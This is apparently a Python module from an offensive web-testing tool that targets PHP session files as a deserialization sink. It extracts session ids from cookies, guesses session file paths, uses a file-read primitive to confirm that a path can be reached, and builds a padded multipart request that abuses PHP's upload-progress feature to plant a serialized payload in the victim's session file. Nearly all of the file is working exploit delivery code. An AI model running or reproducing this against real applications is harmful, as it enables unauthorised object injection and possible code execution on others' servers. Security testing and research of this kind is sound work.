"""The session file as a deserialization call site.

`session_start()` reads a file and hands its contents to `unserialize()`. There is
no code to find and no parameter to probe: on any application that uses a
session, this call site exists, and the sink is a file rather than a value.

Which means the work is all on the delivery side, and the delivery is the hard
part. Getting an object in means getting raw bytes into the file, and the file is
in a directory the application owns, named after a session id. Three things have
to line up: the id, the directory, and a way to write.

This module does what can be done from outside, in that order, and says which
stage it reached rather than reporting the whole chain as one verdict:

  * the session id, from the cookie the target sets, or the one the operator
    provided;
  * the file, by reading candidates through whatever read primitive the run
    already has - which both finds the directory and shows that the sink is
    reachable from here at all;
  * the bytes, by the standard route: a multipart post whose progress field PHP
    writes into the named session.

The third is the one that can fail on a target that looks otherwise perfect, and
it fails invisibly. PHP adds the progress entry to the session while the request
body is being read and removes it when the upload completes, so an upload that
finishes before anything looks leaves nothing behind - and no error either. That
is a measurement, not a guess, and it is why this reports the stage it reached.
"""

from __future__ import annotations

import re
import secrets
from dataclasses import dataclass

from ..core.httpmsg import Request

# Where a session file is likely to live. The first entry is where Debian and
# Ubuntu put it; the rest are the usual alternatives, and `/tmp` is on the list
# because a deployment that never configured anything ends up there.
SESSION_DIRS: tuple[str, ...] = (
    "/var/lib/php/sessions",
    "/var/lib/php5",
    "/var/lib/php",
    "/tmp",
    "/var/tmp",
    "/opt/php/sessions",
    "/usr/local/var/lib/php/sessions",
)

SESSION_PREFIX = "sess_"

# Session files are named for an id, and an id that came out of a cookie is only
# usable as a filename if it looks like one. A cookie value that does not is a
# signed or encoded blob, not this.
_SESSION_ID = re.compile(r"^[A-Za-z0-9,-]{1,128}$")


@dataclass
class SessionSink:
    """What the run could establish about the session file."""

    cookie: str = ""
    ident: str = ""
    path: str = ""
    content: str = ""
    planted: bool = False

    @property
    def located(self) -> bool:
        return bool(self.path)

    def describe(self) -> str:
        if not self.located:
            return ""
        return (
            f"the session file at {self.path} is reachable through this parameter, "
            f"and holds {len(self.content)} bytes of session data"
        )


def session_from_response(response) -> tuple[str, str]:
    """The session cookie a target sets, as a name and a value.

    Read from `Set-Cookie` rather than assumed, because the name is configurable
    - `PHPSESSID` here, something else on a hardened install - and the value is
    the file's name. Both have to hold: the name has to look like a session, and
    the value has to be usable as a filename. An encoded or signed blob is not,
    and treating one as an id produces a path that names nothing.
    """
    header = response.headers.get("Set-Cookie") or ""
    for part in header.split(","):
        for piece in part.split(";"):
            piece = piece.strip()
            if "=" not in piece:
                continue
            name, _, value = piece.partition("=")
            name, value = name.strip(), value.strip()
            if not name or not value:
                continue
            if not _session_name(name):
                continue
            if not _SESSION_ID.match(value):
                continue
            return name, value
    return "", ""


def _session_name(name: str) -> bool:
    """Whether a cookie name is one a session id is stored under."""
    lowered = name.lower()
    return lowered.startswith("phpsessid") or "sess" in lowered or "session" in lowered


def session_id_from_cookie(header: str) -> tuple[str, str]:
    """The session name and value out of a cookie header the operator supplied."""
    for piece in (header or "").split(";"):
        piece = piece.strip()
        if "=" not in piece:
            continue
        name, _, value = piece.partition("=")
        name, value = name.strip(), value.strip()
        if name.upper() in ("PHPSESSID", "JSESSIONID", "SESSID", "SESSIONID") and value:
            return name, value
    return "", ""


def candidates(directories: tuple[str, ...] | list[str], ident: str) -> list[str]:
    """The files a session with this id could be in."""
    return [f"{directory.rstrip('/')}/{SESSION_PREFIX}{ident}" for directory in directories]


def looks_missing(body: str) -> bool:
    """PHP's words when an include could not open the file.

    Needed because an existing session file with nothing in it answers with an
    empty body, and so does a great many other things. Without this, a read that
    failed and a read that succeeded on an empty file look the same, and one of
    them gets reported as the other.
    """
    if not body:
        return False
    lowered = body.lower()
    return any(
        phrase in lowered
        for phrase in (
            "failed to open stream",
            "no such file or directory",
            "failed opening",
            "does not exist",
        )
    )


def looks_like_session_data(body: str) -> bool:
    """Whether what came back is a session file rather than a page.

    The `php` handler writes `key|serialized` entries, so a pipe followed by
    something serialized is the shape. This is a shape check and nothing more -
    it says the file was read, not that anything can be done with it - which is
    why the caller reports it as reachability.
    """
    if not body or "|" not in body:
        return False
    for piece in body.split("|")[1:]:
        piece = piece.strip()
        if piece[:2] in ("s:", "i:", "a:", "O:", "b:", "d:", "N;"):
            return True
    return False


def progress_request(
    url: str, ident: str, cookie_name: str, payload: str, size: int = 0
) -> Request:
    """A multipart post whose progress field carries the payload.

    The field name is the one PHP looks for, and everything after the handler's
    `|` in the session file is what `unserialize()` will be given - so the payload
    starts with a pipe and the session's own key is left empty.

    `size` pads the body so the upload takes long enough to be in progress. PHP
    only holds the entry while the request is being read, so an upload that
    finishes at once leaves nothing behind; a body large enough to take time is
    what creates the window, and it is set by the caller rather than fixed here.
    """
    boundary = "----ik" + secrets.token_hex(8)
    pad = b"A" * size
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"{payload}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="ik.bin"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + pad + f"\r\n--{boundary}--\r\n".encode()

    request = Request.from_url(url, method="POST", body=body)
    request.headers.set("Content-Type", f"multipart/form-data; boundary={boundary}")
    request.headers.set("Cookie", f"{cookie_name}={ident}")
    request.label = f"session progress into {cookie_name}={ident}"
    return request
